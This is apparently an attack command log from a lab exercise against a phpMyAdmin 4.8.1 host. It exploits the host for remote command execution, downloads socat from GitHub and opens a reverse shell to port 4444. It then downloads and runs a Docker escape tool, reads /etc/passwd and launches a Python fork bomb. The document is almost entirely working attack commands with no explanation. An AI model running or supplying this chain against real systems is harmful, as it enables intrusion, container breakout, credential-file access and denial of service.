python3 phpmyadmin481-exec.py 10.0.2.15 8080 /index.php devsecops devsecops whoami

python3 phpmyadmin481-exec.py 10.0.2.15 8080 /index.php devsecops devsecops "curl -L -O https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
python3 phpmyadmin481-exec.py 10.0.2.15 8080 /index.php devsecops devsecops "chmod +x socat"

./socat file:`tty`,raw,echo=0 tcp-listen:4444
python3 phpmyadmin481-exec.py 10.0.2.15 8080 /index.php devsecops devsecops "./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.2.15:4444"

curl -O https://github.com/PercussiveElbow/docker-escape-tool/releases/download/0.2.9/docker-escape
chmod +x docker-escape
./docker-escape auto
cat /etc/passwd

echo -e "import os\nwhile(1):\n\tos.fork();" > fork.py
python3 fork.py
